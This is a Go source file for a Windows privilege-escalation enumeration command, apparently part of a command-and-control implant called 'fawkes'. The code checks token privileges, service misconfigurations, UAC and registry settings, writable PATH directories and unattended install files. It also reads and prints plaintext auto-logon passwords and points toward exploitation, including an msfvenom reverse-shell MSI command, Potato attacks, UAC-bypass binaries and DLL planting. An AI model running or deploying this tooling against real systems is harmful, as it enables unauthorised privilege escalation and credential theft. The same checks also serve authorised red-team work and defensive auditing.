//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

type PrivescCheckCommand struct{}

func (c *PrivescCheckCommand) Name() string {
	return "privesc-check"
}

func (c *PrivescCheckCommand) Description() string {
	return "Windows privilege escalation enumeration: token privileges, unquoted service paths, modifiable services, AlwaysInstallElevated, auto-logon, UAC config, writable PATH dirs (T1548)"
}

type privescCheckArgs struct {
	Action string `json:"action"`
}

func (c *PrivescCheckCommand) Execute(task structs.Task) structs.CommandResult {
	var args privescCheckArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Action == "" {
		args.Action = "all"
	}

	switch strings.ToLower(args.Action) {
	case "all":
		return winPrivescCheckAll()
	case "privileges":
		return winPrivescCheckPrivileges()
	case "services":
		return winPrivescCheckServices()
	case "registry":
		return winPrivescCheckRegistry()
	case "writable":
		return winPrivescCheckWritable()
	case "unattend":
		return winPrivescCheckUnattend()
	case "uac":
		return winPrivescCheckUAC()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: all, privileges, services, registry, writable, unattend, uac", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func winPrivescCheckAll() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== WINDOWS PRIVILEGE ESCALATION CHECK ===\n\n")

	sb.WriteString("--- Token Privileges ---\n")
	sb.WriteString(winPrivescCheckPrivileges().Output)
	sb.WriteString("\n\n")

	sb.WriteString("--- UAC Configuration ---\n")
	sb.WriteString(winPrivescCheckUAC().Output)
	sb.WriteString("\n\n")

	sb.WriteString("--- Service Misconfigurations ---\n")
	sb.WriteString(winPrivescCheckServices().Output)
	sb.WriteString("\n\n")

	sb.WriteString("--- Registry Checks ---\n")
	sb.WriteString(winPrivescCheckRegistry().Output)
	sb.WriteString("\n\n")

	sb.WriteString("--- Writable PATH Directories ---\n")
	sb.WriteString(winPrivescCheckWritable().Output)
	sb.WriteString("\n\n")

	sb.WriteString("--- Unattended Install Files ---\n")
	sb.WriteString(winPrivescCheckUnattend().Output)

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// winPrivescCheckPrivileges enumerates exploitable token privileges
func winPrivescCheckPrivileges() structs.CommandResult {
	var sb strings.Builder

	token, _, err := getCurrentToken()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get current token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer token.Close()

	privs, err := getTokenPrivileges(token)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to enumerate privileges: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Privileges exploitable for privilege escalation
	exploitable := map[string]string{
		"SeImpersonatePrivilege":         "Potato attacks (JuicyPotato, PrintSpoofer, GodPotato) → SYSTEM",
		"SeAssignPrimaryTokenPrivilege":  "Potato attacks → SYSTEM (alternative to SeImpersonate)",
		"SeDebugPrivilege":               "Inject into/dump any process including LSASS",
		"SeBackupPrivilege":              "Read any file (SAM, SYSTEM hives, NTDS.dit)",
		"SeRestorePrivilege":             "Write any file, modify services, DLL hijack",
		"SeTakeOwnershipPrivilege":       "Take ownership of any securable object",
		"SeLoadDriverPrivilege":          "Load vulnerable kernel driver → arbitrary kernel code",
		"SeCreateTokenPrivilege":         "Forge access tokens",
		"SeTcbPrivilege":                 "Act as part of the OS — full SYSTEM access",
		"SeManageVolumePrivilege":        "Read any file on NTFS (USN journal trick)",
		"SeRelabelPrivilege":             "Modify integrity labels on objects",
		"SeTrustedCredManAccessPrivilege": "Access Credential Manager store",
	}

	var found []string
	var all []string
	for _, p := range privs {
		line := fmt.Sprintf("  %-40s [%s]", p.name, p.status)
		all = append(all, line)

		if desc, ok := exploitable[p.name]; ok {
			flag := "[!]"
			if p.status == "Disabled" {
				flag = "[*]" // present but disabled — can be enabled
			}
			found = append(found, fmt.Sprintf("  %s %-40s [%s] → %s", flag, p.name, p.status, desc))
		}
	}

	sb.WriteString(fmt.Sprintf("Token privileges (%d total):\n", len(all)))
	sb.WriteString(strings.Join(all, "\n"))

	if len(found) > 0 {
		sb.WriteString(fmt.Sprintf("\n\n[!] EXPLOITABLE privileges (%d):\n", len(found)))
		sb.WriteString(strings.Join(found, "\n"))
		sb.WriteString("\n\nNote: Disabled privileges can be enabled with 'getprivs -action enable -privilege <name>'")
	} else {
		sb.WriteString("\n\nNo exploitable privileges found.")
	}

	// Check integrity level
	integrity, err := getTokenIntegrityLevel(token)
	if err == nil {
		sb.WriteString(fmt.Sprintf("\n\nIntegrity Level: %s", integrity))
		if strings.Contains(integrity, "Medium") {
			sb.WriteString(" (not elevated — UAC bypass may be needed)")
		} else if strings.Contains(integrity, "High") {
			sb.WriteString(" (elevated admin)")
		} else if strings.Contains(integrity, "System") {
			sb.WriteString(" (SYSTEM)")
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// winPrivescCheckServices checks for unquoted service paths and modifiable service binaries
func winPrivescCheckServices() structs.CommandResult {
	var sb strings.Builder

	m, err := mgr.Connect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to connect to SCM: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer m.Disconnect()

	services, err := m.ListServices()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to list services: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var unquoted []string
	var modifiable []string
	var writableDir []string
	checked := 0

	for _, name := range services {
		s, err := m.OpenService(name)
		if err != nil {
			continue
		}

		cfg, err := s.Config()
		s.Close()
		if err != nil {
			continue
		}
		checked++

		binPath := cfg.BinaryPathName
		if binPath == "" {
			continue
		}

		// Check for unquoted service paths
		if isUnquotedServicePath(binPath) {
			unquoted = append(unquoted, fmt.Sprintf("  %s\n    Path: %s\n    Start: %s", name, binPath, startTypeString(cfg.StartType)))
		}

		// Check if the service binary is writable
		exePath := extractExePath(binPath)
		if exePath != "" {
			if isFileWritable(exePath) {
				modifiable = append(modifiable, fmt.Sprintf("  [!!] %s\n    Path: %s (WRITABLE)", name, exePath))
			}
			// Check if the directory containing the binary is writable
			dir := filepath.Dir(exePath)
			if isDirWritable(dir) {
				writableDir = append(writableDir, fmt.Sprintf("  [!] %s\n    Dir: %s (WRITABLE — DLL planting possible)", name, dir))
			}
		}
	}

	sb.WriteString(fmt.Sprintf("Checked %d services:\n\n", checked))

	sb.WriteString(fmt.Sprintf("Unquoted service paths (%d):\n", len(unquoted)))
	if len(unquoted) > 0 {
		sb.WriteString(strings.Join(unquoted, "\n"))
		sb.WriteString("\n[!] Unquoted paths with spaces allow binary planting in intermediate directories")
	} else {
		sb.WriteString("  (none found)")
	}

	sb.WriteString(fmt.Sprintf("\n\nModifiable service binaries (%d):\n", len(modifiable)))
	if len(modifiable) > 0 {
		sb.WriteString(strings.Join(modifiable, "\n"))
		sb.WriteString("\n[!!] Replace the binary to execute as the service account (often SYSTEM)")
	} else {
		sb.WriteString("  (none found)")
	}

	if len(writableDir) > 0 {
		sb.WriteString(fmt.Sprintf("\n\nWritable service binary directories (%d):\n", len(writableDir)))
		sb.WriteString(strings.Join(writableDir, "\n"))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// winPrivescCheckRegistry checks registry for AlwaysInstallElevated, auto-logon, etc.
func winPrivescCheckRegistry() structs.CommandResult {
	var sb strings.Builder
	findings := 0

	// Check AlwaysInstallElevated (HKLM and HKCU both must be set)
	sb.WriteString("AlwaysInstallElevated:\n")
	hklmElevated := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Policies\Microsoft\Windows\Installer`, "AlwaysInstallElevated")
	hkcuElevated := readRegDWORD(windows.HKEY_CURRENT_USER, `SOFTWARE\Policies\Microsoft\Windows\Installer`, "AlwaysInstallElevated")

	if hklmElevated == 1 && hkcuElevated == 1 {
		sb.WriteString("  [!!] BOTH HKLM and HKCU AlwaysInstallElevated = 1\n")
		sb.WriteString("  Any user can install MSI packages with SYSTEM privileges!\n")
		sb.WriteString("  Exploit: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi\n")
		findings++
	} else {
		if hklmElevated == 1 {
			sb.WriteString("  [*] HKLM AlwaysInstallElevated = 1 (HKCU not set — not exploitable alone)\n")
		} else if hkcuElevated == 1 {
			sb.WriteString("  [*] HKCU AlwaysInstallElevated = 1 (HKLM not set — not exploitable alone)\n")
		} else {
			sb.WriteString("  Not enabled (safe)\n")
		}
	}

	// Check auto-logon credentials
	sb.WriteString("\nAuto-Logon Credentials:\n")
	autoUser := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "DefaultUserName")
	autoPass := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "DefaultPassword")
	autoDomain := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "DefaultDomainName")
	autoLogon := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "AutoAdminLogon")

	if autoLogon == "1" && autoUser != "" {
		sb.WriteString(fmt.Sprintf("  [!!] Auto-logon ENABLED\n"))
		sb.WriteString(fmt.Sprintf("  Domain:   %s\n", autoDomain))
		sb.WriteString(fmt.Sprintf("  Username: %s\n", autoUser))
		if autoPass != "" {
			sb.WriteString(fmt.Sprintf("  Password: %s\n", autoPass))
			findings++
		} else {
			sb.WriteString("  Password: (not stored in plaintext — may use LSA secret)\n")
		}
	} else if autoUser != "" {
		sb.WriteString(fmt.Sprintf("  [*] Default username set: %s (auto-logon not enabled)\n", autoUser))
	} else {
		sb.WriteString("  Not configured\n")
	}

	// Check for stored credentials in WinLogon (additional locations)
	sb.WriteString("\nLSA Protection:\n")
	runAsPPL := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, "RunAsPPL")
	if runAsPPL == 1 {
		sb.WriteString("  [*] LSA Protection (RunAsPPL) is ENABLED — LSASS is protected\n")
	} else {
		sb.WriteString("  [!] LSA Protection (RunAsPPL) is NOT enabled — LSASS can be dumped\n")
		findings++
	}

	// Credential Guard
	lsaCfgFlags := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\LSA`, "LsaCfgFlags")
	if lsaCfgFlags >= 1 {
		sb.WriteString("  [*] Credential Guard is ENABLED — credential theft is harder\n")
	} else {
		sb.WriteString("  Credential Guard is not enabled\n")
	}

	// WSUS configuration (potential for compromise if using HTTP)
	sb.WriteString("\nWSUS Configuration:\n")
	wuServer := readRegString(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate`, "WUServer")
	if wuServer != "" {
		sb.WriteString(fmt.Sprintf("  WSUS Server: %s\n", wuServer))
		if strings.HasPrefix(strings.ToLower(wuServer), "http://") {
			sb.WriteString("  [!!] WSUS is using HTTP (not HTTPS) — vulnerable to WSUS attacks\n")
			findings++
		}
	} else {
		sb.WriteString("  Not configured (using Microsoft Update directly)\n")
	}

	if findings > 0 {
		sb.WriteString(fmt.Sprintf("\n[!] %d exploitable registry finding(s) detected", findings))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// winPrivescCheckWritable checks for writable directories in PATH
func winPrivescCheckWritable() structs.CommandResult {
	var sb strings.Builder

	pathDirs := strings.Split(os.Getenv("PATH"), ";")
	var writablePATH []string

	for _, dir := range pathDirs {
		dir = strings.TrimSpace(dir)
		if dir == "" {
			continue
		}
		if isDirWritable(dir) {
			writablePATH = append(writablePATH, "  "+dir)
		}
	}

	sb.WriteString(fmt.Sprintf("Writable PATH directories (%d of %d):\n", len(writablePATH), len(pathDirs)))
	if len(writablePATH) > 0 {
		sb.WriteString(strings.Join(writablePATH, "\n"))
		sb.WriteString("\n[!] Writable PATH directories enable DLL hijacking and binary planting")
		sb.WriteString("\n    Place a malicious DLL/EXE with a commonly-loaded name to hijack execution")
	} else {
		sb.WriteString("  (none — PATH is clean)")
	}

	// Check common DLL hijack target directories
	sb.WriteString("\n\nDLL Hijack Target Directories:\n")
	hijackDirs := []struct {
		path string
		desc string
	}{
		{`C:\Python27`, "Python 2.7 (common DLL hijack target)"},
		{`C:\Python36`, "Python 3.6"},
		{`C:\Python37`, "Python 3.7"},
		{`C:\Python38`, "Python 3.8"},
		{`C:\Python39`, "Python 3.9"},
		{`C:\Python310`, "Python 3.10"},
		{`C:\Python311`, "Python 3.11"},
		{`C:\Python312`, "Python 3.12"},
		{os.Getenv("TEMP"), "Current user TEMP directory"},
	}

	for _, d := range hijackDirs {
		if d.path == "" {
			continue
		}
		if isDirWritable(d.path) {
			sb.WriteString(fmt.Sprintf("  [!] %s — %s (WRITABLE)\n", d.path, d.desc))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// winPrivescCheckUnattend checks for unattended install files containing credentials
func winPrivescCheckUnattend() structs.CommandResult {
	var sb strings.Builder

	systemRoot := os.Getenv("SystemRoot")
	if systemRoot == "" {
		systemRoot = `C:\Windows`
	}
	systemDrive := os.Getenv("SystemDrive")
	if systemDrive == "" {
		systemDrive = `C:`
	}

	unattendPaths := []string{
		filepath.Join(systemRoot, "Panther", "Unattend.xml"),
		filepath.Join(systemRoot, "Panther", "unattend.xml"),
		filepath.Join(systemRoot, "Panther", "Unattended.xml"),
		filepath.Join(systemRoot, "Panther", "unattended.xml"),
		filepath.Join(systemRoot, "Panther", "Autounattend.xml"),
		filepath.Join(systemRoot, "System32", "Sysprep", "unattend.xml"),
		filepath.Join(systemRoot, "System32", "Sysprep", "Unattend.xml"),
		filepath.Join(systemRoot, "System32", "Sysprep", "Panther", "unattend.xml"),
		filepath.Join(systemDrive, "unattend.xml"),
		filepath.Join(systemDrive, "Autounattend.xml"),
	}

	var found []string
	for _, path := range unattendPaths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		content := string(data)
		hasPassword := strings.Contains(strings.ToLower(content), "<password>") ||
			strings.Contains(strings.ToLower(content), "cpassword") ||
			strings.Contains(strings.ToLower(content), "adminpassword")

		entry := fmt.Sprintf("  %s (%d bytes)", path, len(data))
		if hasPassword {
			entry += "\n    [!!] Contains password fields — credentials may be recoverable"
		}
		found = append(found, entry)
	}

	sb.WriteString(fmt.Sprintf("Unattended install files (%d found):\n", len(found)))
	if len(found) > 0 {
		sb.WriteString(strings.Join(found, "\n"))
		sb.WriteString("\n\nUse 'cat' to read the file and look for <Password> or <AutoLogon> sections")
	} else {
		sb.WriteString("  (none found)")
	}

	// Check for other interesting files
	var interestingFiles []string
	otherPaths := []struct {
		path string
		desc string
	}{
		{filepath.Join(systemRoot, "repair", "SAM"), "SAM backup"},
		{filepath.Join(systemRoot, "repair", "SYSTEM"), "SYSTEM backup"},
		{filepath.Join(systemRoot, "debug", "NetSetup.log"), "Domain join log (may contain creds)"},
		{filepath.Join(systemDrive, "inetpub", "wwwroot", "web.config"), "IIS web.config"},
	}

	for _, f := range otherPaths {
		if info, err := os.Stat(f.path); err == nil {
			if isFileReadable(f.path) {
				interestingFiles = append(interestingFiles, fmt.Sprintf("  %s — %s (%d bytes)", f.path, f.desc, info.Size()))
			}
		}
	}

	if len(interestingFiles) > 0 {
		sb.WriteString(fmt.Sprintf("\n\nOther interesting files (%d):\n", len(interestingFiles)))
		sb.WriteString(strings.Join(interestingFiles, "\n"))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// winPrivescCheckUAC reports the current UAC configuration
func winPrivescCheckUAC() structs.CommandResult {
	var sb strings.Builder

	enableLUA := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "EnableLUA")
	consentPromptBehavior := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "ConsentPromptBehaviorAdmin")
	promptOnSecureDesktop := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "PromptOnSecureDesktop")
	filterAdminToken := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "FilterAdministratorToken")

	if enableLUA == 0 {
		sb.WriteString("[!!] UAC is DISABLED (EnableLUA = 0)\n")
		sb.WriteString("All admin users run with full admin privileges — no elevation needed\n")
	} else {
		sb.WriteString("UAC is enabled (EnableLUA = 1)\n")

		sb.WriteString(fmt.Sprintf("\nAdmin consent prompt behavior: "))
		switch consentPromptBehavior {
		case 0:
			sb.WriteString("Elevate without prompting (0)\n")
			sb.WriteString("[!!] Auto-elevation — UAC bypass is trivial (silent elevation)\n")
		case 1:
			sb.WriteString("Prompt for credentials on secure desktop (1)\n")
		case 2:
			sb.WriteString("Prompt for consent on secure desktop (2)\n")
		case 3:
			sb.WriteString("Prompt for credentials (3)\n")
		case 4:
			sb.WriteString("Prompt for consent (4)\n")
		case 5:
			sb.WriteString("Prompt for consent for non-Windows binaries (5) — DEFAULT\n")
			sb.WriteString("[*] Standard config — UAC bypass via auto-elevating binaries possible (fodhelper, computerdefaults, sdclt)\n")
		default:
			sb.WriteString(fmt.Sprintf("Unknown (%d)\n", consentPromptBehavior))
		}

		if promptOnSecureDesktop == 0 {
			sb.WriteString("[*] Secure desktop is DISABLED — easier to interact with UAC prompt programmatically\n")
		}

		if filterAdminToken == 0 {
			sb.WriteString("[*] Built-in Administrator account is NOT filtered (RID 500 bypass)\n")
			sb.WriteString("    If running as built-in Administrator, you already have full admin without UAC\n")
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// --- Windows-specific helper functions ---

func isFileWritable(path string) bool {
	f, err := os.OpenFile(path, os.O_WRONLY|os.O_APPEND, 0)
	if err != nil {
		return false
	}
	f.Close()
	return true
}

func readRegDWORD(root windows.Handle, path, name string) uint32 {
	var key windows.Handle
	pathUTF16, _ := windows.UTF16PtrFromString(path)
	err := windows.RegOpenKeyEx(root, pathUTF16, 0, windows.KEY_READ, &key)
	if err != nil {
		return 0xFFFFFFFF // sentinel for "not found"
	}
	defer windows.RegCloseKey(key)

	var dataType uint32
	var data [4]byte
	dataLen := uint32(4)
	nameUTF16, _ := windows.UTF16PtrFromString(name)
	err = windows.RegQueryValueEx(key, nameUTF16, nil, &dataType, &data[0], &dataLen)
	if err != nil {
		return 0xFFFFFFFF
	}

	return *(*uint32)(unsafe.Pointer(&data[0]))
}

func readRegString(root windows.Handle, path, name string) string {
	var key windows.Handle
	pathUTF16, _ := windows.UTF16PtrFromString(path)
	err := windows.RegOpenKeyEx(root, pathUTF16, 0, windows.KEY_READ, &key)
	if err != nil {
		return ""
	}
	defer windows.RegCloseKey(key)

	var dataType uint32
	var dataLen uint32
	nameUTF16, _ := windows.UTF16PtrFromString(name)
	// First call to get the size
	err = windows.RegQueryValueEx(key, nameUTF16, nil, &dataType, nil, &dataLen)
	if err != nil || dataLen == 0 {
		return ""
	}

	buf := make([]uint16, dataLen/2)
	err = windows.RegQueryValueEx(key, nameUTF16, nil, &dataType, (*byte)(unsafe.Pointer(&buf[0])), &dataLen)
	if err != nil {
		return ""
	}

	return windows.UTF16ToString(buf)
}
